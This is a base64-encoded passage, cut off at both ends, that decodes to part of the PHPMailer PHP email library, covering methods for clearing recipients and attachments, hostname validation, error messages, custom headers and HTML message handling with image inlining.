DaGVjayBpZiBhbiBhdHRhY2htZW50IChub24taW5saW5lKSBpcyBwcmVzZW50LgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYXR0YWNobWVudEV4aXN0cygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmF0dGFjaG1lbnQgYXMgJGF0dGFjaG1lbnQpIHsKICAgICAgICAgICAgaWYgKCdhdHRhY2htZW50JyA9PSAkYXR0YWNobWVudFs2XSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgLyoqCiAgICAgKiBDaGVjayBpZiB0aGlzIG1lc3NhZ2UgaGFzIGFuIGFsdGVybmF0aXZlIGJvZHkgc2V0LgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWx0ZXJuYXRpdmVFeGlzdHMoKQogICAgewogICAgICAgIHJldHVybiAhZW1wdHkoJHRoaXMtPkFsdEJvZHkpOwogICAgfQogICAgLyoqCiAgICAgKiBDbGVhciBxdWV1ZWQgYWRkcmVzc2VzIG9mIGdpdmVuIGtpbmQuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAka2luZCAndG8nLCAnY2MnLCBvciAnYmNjJwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJRdWV1ZWRBZGRyZXNzZXMoJGtpbmQpCiAgICB7CiAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSA9IGFycmF5X2ZpbHRlcigKICAgICAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSwKICAgICAgICAgICAgZnVuY3Rpb24gKCRwYXJhbXMpIHVzZSAoJGtpbmQpIHsKICAgICAgICAgICAgICAgIHJldHVybiAkcGFyYW1zWzBdICE9ICRraW5kOwogICAgICAgICAgICB9CiAgICAgICAgKTsKICAgIH0KICAgIC8qKgogICAgICogQ2xlYXIgYWxsIFRvIHJlY2lwaWVudHMuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckFkZHJlc3NlcygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0bykgewogICAgICAgICAgICB1bnNldCgkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkdG9bMF0pXSk7CiAgICAgICAgfQogICAgICAgICR0aGlzLT50byA9IFtdOwogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygndG8nKTsKICAgIH0KICAgIC8qKgogICAgICogQ2xlYXIgYWxsIENDIHJlY2lwaWVudHMuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckNDcygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmNjIGFzICRjYykgewogICAgICAgICAgICB1bnNldCgkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkY2NbMF0pXSk7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5jYyA9IFtdOwogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnY2MnKTsKICAgIH0KICAgIC8qKgogICAgICogQ2xlYXIgYWxsIEJDQyByZWNpcGllbnRzLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJCQ0NzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YmNjIGFzICRiY2MpIHsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGJjY1swXSldKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPmJjYyA9IFtdOwogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnYmNjJyk7CiAgICB9CiAgICAvKioKICAgICAqIENsZWFyIGFsbCBSZXBseVRvIHJlY2lwaWVudHMuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhclJlcGx5VG9zKCkKICAgIHsKICAgICAgICAkdGhpcy0+UmVwbHlUbyA9IFtdOwogICAgICAgICR0aGlzLT5SZXBseVRvUXVldWUgPSBbXTsKICAgIH0KICAgIC8qKgogICAgICogQ2xlYXIgYWxsIHJlY2lwaWVudCB0eXBlcy4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQWxsUmVjaXBpZW50cygpCiAgICB7CiAgICAgICAgJHRoaXMtPnRvID0gW107CiAgICAgICAgJHRoaXMtPmNjID0gW107CiAgICAgICAgJHRoaXMtPmJjYyA9IFtdOwogICAgICAgICR0aGlzLT5hbGxfcmVjaXBpZW50cyA9IFtdOwogICAgICAgICR0aGlzLT5SZWNpcGllbnRzUXVldWUgPSBbXTsKICAgIH0KICAgIC8qKgogICAgICogQ2xlYXIgYWxsIGZpbGVzeXN0ZW0sIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cy4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQXR0YWNobWVudHMoKQogICAgewogICAgICAgICR0aGlzLT5hdHRhY2htZW50ID0gW107CiAgICB9CiAgICAvKioKICAgICAqIENsZWFyIGFsbCBjdXN0b20gaGVhZGVycy4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQ3VzdG9tSGVhZGVycygpCiAgICB7CiAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlciA9IFtdOwogICAgfQogICAgLyoqCiAgICAgKiBBZGQgYW4gZXJyb3IgbWVzc2FnZSB0byB0aGUgZXJyb3IgY29udGFpbmVyLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJG1zZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0RXJyb3IoJG1zZykKICAgIHsKICAgICAgICArKyR0aGlzLT5lcnJvcl9jb3VudDsKICAgICAgICBpZiAoJ3NtdHAnID09ICR0aGlzLT5NYWlsZXIgYW5kIG51bGwgIT09ICR0aGlzLT5zbXRwKSB7CiAgICAgICAgICAgICRsYXN0ZXJyb3IgPSAkdGhpcy0+c210cC0+Z2V0RXJyb3IoKTsKICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydlcnJvciddKSkgewogICAgICAgICAgICAgICAgJG1zZyAuPSAkdGhpcy0+bGFuZygnc210cF9lcnJvcicpIC4gJGxhc3RlcnJvclsnZXJyb3InXTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnZGV0YWlsJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIERldGFpbDogJyAuICRsYXN0ZXJyb3JbJ2RldGFpbCddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydzbXRwX2NvZGUnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgU01UUCBjb2RlOiAnIC4gJGxhc3RlcnJvclsnc210cF9jb2RlJ107CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ3NtdHBfY29kZV9leCddKSkgewogICAgICAgICAgICAgICAgICAgICRtc2cgLj0gJyBBZGRpdGlvbmFsIFNNVFAgaW5mbzogJyAuICRsYXN0ZXJyb3JbJ3NtdHBfY29kZV9leCddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5FcnJvckluZm8gPSAkbXNnOwogICAgfQogICAgLyoqCiAgICAgKiBSZXR1cm4gYW4gUkZDIDgyMiBmb3JtYXR0ZWQgZGF0ZS4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHJmY0RhdGUoKQogICAgewogICAgICAgIC8vIFNldCB0aGUgdGltZSB6b25lIHRvIHdoYXRldmVyIHRoZSBkZWZhdWx0IGlzIHRvIGF2b2lkIDUwMCBlcnJvcnMKICAgICAgICAvLyBXaWxsIGRlZmF1bHQgdG8gVVRDIGlmIGl0J3Mgbm90IHNldCBwcm9wZXJseSBpbiBwaHAuaW5pCiAgICAgICAgZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldChAZGF0ZV9kZWZhdWx0X3RpbWV6b25lX2dldCgpKTsKICAgICAgICByZXR1cm4gZGF0ZSgnRCwgaiBNIFkgSDppOnMgTycpOwogICAgfQogICAgLyoqCiAgICAgKiBHZXQgdGhlIHNlcnZlciBob3N0bmFtZS4KICAgICAqIFJldHVybnMgJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbicgaWYgdW5rbm93bi4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VydmVySG9zdG5hbWUoKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5Ib3N0bmFtZSkpIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5Ib3N0bmFtZTsKICAgICAgICB9IGVsc2VpZiAoaXNzZXQoJF9TRVJWRVIpIGFuZCBhcnJheV9rZXlfZXhpc3RzKCdTRVJWRVJfTkFNRScsICRfU0VSVkVSKSkgewogICAgICAgICAgICAkcmVzdWx0ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnZ2V0aG9zdG5hbWUnKSBhbmQgZ2V0aG9zdG5hbWUoKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgJHJlc3VsdCA9IGdldGhvc3RuYW1lKCk7CiAgICAgICAgfSBlbHNlaWYgKHBocF91bmFtZSgnbicpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkcmVzdWx0ID0gcGhwX3VuYW1lKCduJyk7CiAgICAgICAgfQogICAgICAgIGlmICghc3RhdGljOjppc1ZhbGlkSG9zdCgkcmVzdWx0KSkgewogICAgICAgICAgICByZXR1cm4gJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbic7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQogICAgLyoqCiAgICAgKiBWYWxpZGF0ZSB3aGV0aGVyIGEgc3RyaW5nIGNvbnRhaW5zIGEgdmFsaWQgdmFsdWUgdG8gdXNlIGFzIGEgaG9zdG5hbWUgb3IgSVAgYWRkcmVzcy4KICAgICAqIElQdjYgYWRkcmVzc2VzIG11c3QgaW5jbHVkZSBbXSwgZS5nLiBgWzo6MV1gLCBub3QganVzdCBgOjoxYC4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRob3N0IFRoZSBob3N0IG5hbWUgb3IgSVAgYWRkcmVzcyB0byBjaGVjawogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGlzVmFsaWRIb3N0KCRob3N0KQogICAgewogICAgICAgIC8vU2ltcGxlIHN5bnRheCBsaW1pdHMKICAgICAgICBpZiAoZW1wdHkoJGhvc3QpCiAgICAgICAgICAgIG9yICFpc19zdHJpbmcoJGhvc3QpCiAgICAgICAgICAgIG9yIHN0cmxlbigkaG9zdCkgPiAyNTYKICAgICAgICApIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAvL0xvb2tzIGxpa2UgYSBicmFja2V0ZWQgSVB2NiBhZGRyZXNzCiAgICAgICAgaWYgKHRyaW0oJGhvc3QsICdbXScpICE9ICRob3N0KSB7CiAgICAgICAgICAgIHJldHVybiAoYm9vbCkgZmlsdGVyX3Zhcih0cmltKCRob3N0LCAnW10nKSwgRklMVEVSX1ZBTElEQVRFX0lQLCBGSUxURVJfRkxBR19JUFY2KTsKICAgICAgICB9CiAgICAgICAgLy9JZiByZW1vdmluZyBhbGwgdGhlIGRvdHMgcmVzdWx0cyBpbiBhIG51bWVyaWMgc3RyaW5nLCBpdCBtdXN0IGJlIGFuIElQdjQgYWRkcmVzcy4KICAgICAgICAvL05lZWQgdG8gY2hlY2sgdGhpcyBmaXJzdCBiZWNhdXNlIG90aGVyd2lzZSB0aGluZ3MgbGlrZSBgOTk5LjAuMC4wYCBhcmUgY29uc2lkZXJlZCB2YWxpZCBob3N0IG5hbWVzCiAgICAgICAgaWYgKGlzX251bWVyaWMoc3RyX3JlcGxhY2UoJy4nLCAnJywgJGhvc3QpKSkgewogICAgICAgICAgICAvL0lzIGl0IGEgdmFsaWQgSVB2NCBhZGRyZXNzPwogICAgICAgICAgICByZXR1cm4gKGJvb2wpIGZpbHRlcl92YXIoJGhvc3QsIEZJTFRFUl9WQUxJREFURV9JUCwgRklMVEVSX0ZMQUdfSVBWNCk7CiAgICAgICAgfQogICAgICAgIGlmIChmaWx0ZXJfdmFyKCdodHRwOi8vJyAuICRob3N0LCBGSUxURVJfVkFMSURBVEVfVVJMKSkgewogICAgICAgICAgICAvL0lzIGl0IGEgc3ludGFjdGljYWxseSB2YWxpZCBob3N0bmFtZT8KICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgIC8qKgogICAgICogR2V0IGFuIGVycm9yIG1lc3NhZ2UgaW4gdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAka2V5CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGxhbmcoJGtleSkKICAgIHsKICAgICAgICBpZiAoY291bnQoJHRoaXMtPmxhbmd1YWdlKSA8IDEpIHsKICAgICAgICAgICAgJHRoaXMtPnNldExhbmd1YWdlKCdlbicpOyAvLyBzZXQgdGhlIGRlZmF1bHQgbGFuZ3VhZ2UKICAgICAgICB9CiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJGtleSwgJHRoaXMtPmxhbmd1YWdlKSkgewogICAgICAgICAgICBpZiAoJ3NtdHBfY29ubmVjdF9mYWlsZWQnID09ICRrZXkpIHsKICAgICAgICAgICAgICAgIC8vSW5jbHVkZSBhIGxpbmsgdG8gdHJvdWJsZXNob290aW5nIGRvY3Mgb24gU01UUCBjb25uZWN0aW9uIGZhaWx1cmUKICAgICAgICAgICAgICAgIC8vdGhpcyBpcyBieSBmYXIgdGhlIGJpZ2dlc3QgY2F1c2Ugb2Ygc3VwcG9ydCBxdWVzdGlvbnMKICAgICAgICAgICAgICAgIC8vYnV0IGl0J3MgdXN1YWxseSBub3QgUEhQTWFpbGVyJ3MgZmF1bHQuCiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlWyRrZXldOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2VbJGtleV07CiAgICAgICAgfQogICAgICAgIC8vUmV0dXJuIHRoZSBrZXkgYXMgYSBmYWxsYmFjawogICAgICAgIHJldHVybiAka2V5OwogICAgfQogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBlcnJvciBvY2N1cnJlZC4KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgVHJ1ZSBpZiBhbiBlcnJvciBkaWQgb2NjdXIKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzRXJyb3IoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+ZXJyb3JfY291bnQgPiAwOwogICAgfQogICAgLyoqCiAgICAgKiBBZGQgYSBjdXN0b20gaGVhZGVyLgogICAgICogJG5hbWUgdmFsdWUgY2FuIGJlIG92ZXJsb2FkZWQgdG8gY29udGFpbgogICAgICogYm90aCBoZWFkZXIgbmFtZSBhbmQgdmFsdWUgKG5hbWU6dmFsdWUpLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICAkbmFtZSAgQ3VzdG9tIGhlYWRlciBuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nfG51bGwgJHZhbHVlIEhlYWRlciB2YWx1ZQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQ3VzdG9tSGVhZGVyKCRuYW1lLCAkdmFsdWUgPSBudWxsKQogICAgewogICAgICAgIGlmIChudWxsID09PSAkdmFsdWUpIHsKICAgICAgICAgICAgLy8gVmFsdWUgcGFzc2VkIGluIGFzIG5hbWU6dmFsdWUKICAgICAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlcltdID0gZXhwbG9kZSgnOicsICRuYW1lLCAyKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBbJG5hbWUsICR2YWx1ZV07CiAgICAgICAgfQogICAgfQogICAgLyoqCiAgICAgKiBSZXR1cm5zIGFsbCBjdXN0b20gaGVhZGVycy4KICAgICAqCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRDdXN0b21IZWFkZXJzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPkN1c3RvbUhlYWRlcjsKICAgIH0KICAgIC8qKgogICAgICogQ3JlYXRlIGEgbWVzc2FnZSBib2R5IGZyb20gYW4gSFRNTCBzdHJpbmcuCiAgICAgKiBBdXRvbWF0aWNhbGx5IGlubGluZXMgaW1hZ2VzIGFuZCBjcmVhdGVzIGEgcGxhaW4tdGV4dCB2ZXJzaW9uIGJ5IGNvbnZlcnRpbmcgdGhlIEhUTUwsCiAgICAgKiBvdmVyd3JpdGluZyBhbnkgZXhpc3RpbmcgdmFsdWVzIGluIEJvZHkgYW5kIEFsdEJvZHkuCiAgICAgKiBEbyBub3Qgc291cmNlICRtZXNzYWdlIGNvbnRlbnQgZnJvbSB1c2VyIGlucHV0IQogICAgICogJGJhc2VkaXIgaXMgcHJlcGVuZGVkIHdoZW4gaGFuZGxpbmcgcmVsYXRpdmUgVVJMcywgZS5nLiA8aW1nIHNyYz0iL2ltYWdlcy9hLnBuZyI+IGFuZCBtdXN0IG5vdCBiZSBlbXB0eQogICAgICogd2lsbCBsb29rIGZvciBhbiBpbWFnZSBmaWxlIGluICRiYXNlZGlyL2ltYWdlcy9hLnBuZyBhbmQgY29udmVydCBpdCB0byBpbmxpbmUuCiAgICAgKiBJZiB5b3UgZG9uJ3QgcHJvdmlkZSBhICRiYXNlZGlyLCByZWxhdGl2ZSBwYXRocyB3aWxsIGJlIGxlZnQgdW50b3VjaGVkIChhbmQgdGh1cyBwcm9iYWJseSBicmVhayBpbiBlbWFpbCkKICAgICAqIENvbnZlcnRzIGRhdGEtdXJpIGltYWdlcyBpbnRvIGVtYmVkZGVkIGF0dGFjaG1lbnRzLgogICAgICogSWYgeW91IGRvbid0IHdhbnQgdG8gYXBwbHkgdGhlc2UgdHJhbnNmb3JtYXRpb25zIHRvIHlvdXIgSFRNTCwganVzdCBzZXQgQm9keSBhbmQgQWx0Qm9keSBkaXJlY3RseS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICAgICAkbWVzc2FnZSAgSFRNTCBtZXNzYWdlIHN0cmluZwogICAgICogQHBhcmFtIHN0cmluZyAgICAgICAgJGJhc2VkaXIgIEFic29sdXRlIHBhdGggdG8gYSBiYXNlIGRpcmVjdG9yeSB0byBwcmVwZW5kIHRvIHJlbGF0aXZlIHBhdGhzIHRvIGltYWdlcwogICAgICogQHBhcmFtIGJvb2x8Y2FsbGFibGUgJGFkdmFuY2VkIFdoZXRoZXIgdG8gdXNlIHRoZSBpbnRlcm5hbCBIVE1MIHRvIHRleHQgY29udmVydGVyCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3IgeW91ciBvd24gY3VzdG9tIGNvbnZlcnRlciBAc2VlIFBIUE1haWxlcjo6aHRtbDJ0ZXh0KCkKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZyAkbWVzc2FnZSBUaGUgdHJhbnNmb3JtZWQgbWVzc2FnZSBCb2R5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBtc2dIVE1MKCRtZXNzYWdlLCAkYmFzZWRpciA9ICcnLCAkYWR2YW5jZWQgPSBmYWxzZSkKICAgIHsKICAgICAgICBwcmVnX21hdGNoX2FsbCgnLyhzcmN8YmFja2dyb3VuZCk9WyJcJ10oLiopWyJcJ10vVWknLCAkbWVzc2FnZSwgJGltYWdlcyk7CiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJGltYWdlcykpIHsKICAgICAgICAgICAgaWYgKHN0cmxlbigkYmFzZWRpcikgPiAxICYmICcvJyAhPSBzdWJzdHIoJGJhc2VkaXIsIC0xKSkgewogICAgICAgICAgICAgICAgLy8gRW5zdXJlICRiYXNlZGlyIGhhcyBhIHRyYWlsaW5nIC8KICAgICAgICAgICAgICAgICRiYXNlZGlyIC49ICcvJzsKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3JlYWNoICgkaW1hZ2VzWzJdIGFzICRpbWdpbmRleCA9PiAkdXJsKSB7CiAgICAgICAgICAgICAgICAvLyBDb252ZXJ0IGRhdGEgVVJJcyBpbnRvIGVtYmVkZGVkIGltYWdlcwogICAgICAgICAgICAgICAgLy9lLmcuICJkYXRhOmltYWdlL2dpZjtiYXNlNjQsUjBsR09EbGhBUUFCQUFBQUFDSDVCQUVLQUFFQUxBQUFBQUFCQUFFQUFBSUNUQUVBT3c9PSIKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcjXmRhdGE6KGltYWdlLyg/OmpwZT9nfGdpZnxwbmcpKTs/KGJhc2U2NCk/LCguKykjJywgJHVybCwgJG1hdGNoKSkgewogICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCgkbWF0Y2gpID09IDQgYW5kIHN0YXRpYzo6RU5DT0RJTkdfQkFTRTY0ID09ICRtYXRjaFsyXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IGJhc2U2NF9kZWNvZGUoJG1hdGNoWzNdKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJycgPT0gJG1hdGNoWzJdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhID0gcmF3dXJsZGVjb2RlKCRtYXRjaFszXSk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy9Ob3QgcmVjb2duaXNlZCBzbyBsZWF2ZSBpdCBhbG9uZQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgLy9IYXNoIHRoZSBkZWNvZGVkIGRhdGEsIG5vdCB0aGUgVVJMIHNvIHRoYXQgdGhlIHNhbWUgZGF0YS1VUkkgaW1hZ2UgdXNlZCBpbiBtdWx0aXBsZSBwbGFjZXMKICAgICAgICAgICAgICAgICAgICAvL3dpbGwgb25seSBiZSBlbWJlZGRlZCBvbmNlLCBldmVuIGlmIGl0IHVzZWQgYSBkaWZmZXJlbnQgZW5jb2RpbmcKICAgICAgICAgICAgICAgICAgICAkY2lkID0gaGFzaCgnc2hhMjU2JywgJGRhdGEpIC4gJ0BwaHBtYWlsZXIuMCc7IC8vIFJGQzIzOTIgUyAyCiAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+Y2lkRXhpc3RzKCRjaWQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5hZGRTdHJpbmdFbWJlZGRlZEltYWdlKCRkYXRhLCAkY2lkLCAnZW1iZWQnIC4gJGltZ2luZGV4LCBzdGF0aWM6OkVOQ09ESU5HX0JBU0U2NCwgJG1hdGNoWzFdKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSBzdHJfcmVwbGFjZSgKICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1swXVskaW1naW5kZXhdLAogICAgICAgICAgICAgICAgICAgICAgICAkaW1hZ2VzWzFdWyRpbWdpbmRleF0gLiAnPSJjaWQ6JyAuICRjaWQgLiAnIicsCiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgvLyBPbmx5IHByb2Nlc3MgcmVsYXRpdmUgVVJMcyBpZiBhIGJhc2VkaXIgaXMgcHJvdmlkZWQgKGkuZS4gbm8gYWJzb2x1dGUgbG9jYWwgcGF0aHMpCiAgICAgICAgICAgICAgICAgICAgIWVtcHR5KCRiYXNlZGlyKQogICAgICAgICAgICAgICAgICAgIC8vIElnbm9yZSBVUkxzIGNvbnRhaW5pbmcgcGFyZW50IGRpciB0cmF2ZXJzYWwgKC4uKQogICAgICAgICAgICAgICAgICAgIGFuZCAoc3RycG9zKCR1cmwsICcuLicpID09PSBmYWxzZSkKICAgICAgICAgICAgICAgICAgICAvLyBEbyBub3QgY2hhbmdlIHVybHMgdGhhdCBhcmUgYWxyZWFkeSBpbmxpbmUgaW1hZ2VzCiAgICAgICAgICAgICAgICAgICAgYW5kIDAgIT09IHN0cnBvcygkdXJsLCAnY2lkOicpCiAgICAgICAgICAgICAgICAgICAgLy8gRG8gbm90IGNoYW5nZSBhYnNvbHV0ZSBVUkxzLCBpbmNsdWRpbmcgYW5vbnltb3VzIHByb3RvY29sCiAgICAgICAgICAgICAgICAgICAgYW5kICFwcmVnX21hdGNoKCcjXlthLXpdW2EtejAtOSsuLV0qOj8vLyNpJywgJHVybCkKICAgICAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCR1cmwpOwogICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgPSBkaXJuYW1lKCR1cmwpOwogICAgICAgICAgICAgICAgICAgIGlmICgnLicgPT0gJGRpcmVjdG9yeSkgewogICAgICAgICAgICAgICAgICAgICAgICAkZGlyZWN0b3J5ID0gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRjaWQgPSBoYXNoKCdzaGEyNTYnLCAkdXJsKSAuICdAcGhwbWFpbGVyLjAnOyAvLyBSRkMyMzkyIFMgMgogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGJhc2VkaXIpID4gMSBhbmQgJy8nICE9IHN1YnN0cigkYmFzZWRpciwgLTEpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRiYXNlZGlyIC49ICcvJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkZGlyZWN0b3J5KSA+IDEgYW5kICcvJyAhPSBzdWJzdHIoJGRpcmVjdG9yeSwgLTEpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgLj0gJy8nOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmFkZEVtYmVkZGVkSW1hZ2UoCiAgICAgICAgICAgICAgICAgICAgICAgICRiYXNlZGlyIC4gJGRpcmVjdG9yeSAuICRmaWxlbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgJGNpZCwKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OkVOQ09ESU5HX0JBU0U2NCwKICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGljOjpfbWltZV90eXBlcygoc3RyaW5nKSBzdGF0aWM6Om1iX3BhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSkKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gcHJlZ19yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJy8nIC4gJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz1bIlwnXScgLiBwcmVnX3F1b3RlKCR1cmwsICcvJykgLiAnWyJcJ10vVWknLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHRoaXMtPmlzSFRNTCh0cnVlKTsKICAgICAgICAvLyBDb252ZXJ0IGFsbCBtZXNzYWdlIGJvZHkgbGluZSBicmVha3MgdG8gTEUsIG1ha2VzIHF1b3RlZC1wcmludGFibGUgZW5jb2Rpbmcgd29yayBtdWNoIGJldHRlcgogICAgICAgICR0aGlzLT5Cb2R5ID0gc3RhdGljOjpub3JtYWxpemVCcmVha3MoJG1lc3NhZ2UpOwogICAgICAgICR0aGlzLT5BbHRCb2R5ID0gc3RhdGljOjpub3JtYWxpemVCcmVha3MoJHRoa